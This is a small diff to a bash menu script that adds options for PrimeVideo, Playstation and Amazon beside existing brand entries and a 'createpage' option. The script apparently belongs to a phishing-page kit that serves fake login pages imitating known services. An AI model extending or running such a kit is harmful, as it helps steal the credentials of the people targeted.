@@ -228,6 +228,18 @@ elif [[ $option == 42 ]]; then
 server="pornhub"
 start
 
+elif [[ $option == 43 ]]; then
+server="PrimeVideo"
+start
+
+elif [[ $option == 44 ]]; then
+server="Playstation"
+start
+
+elif [[ $option == 45 ]]; then
+server="Amazon"
+start
+
 elif [[ $option == 99 ]]; then
 server="create"
 createpage
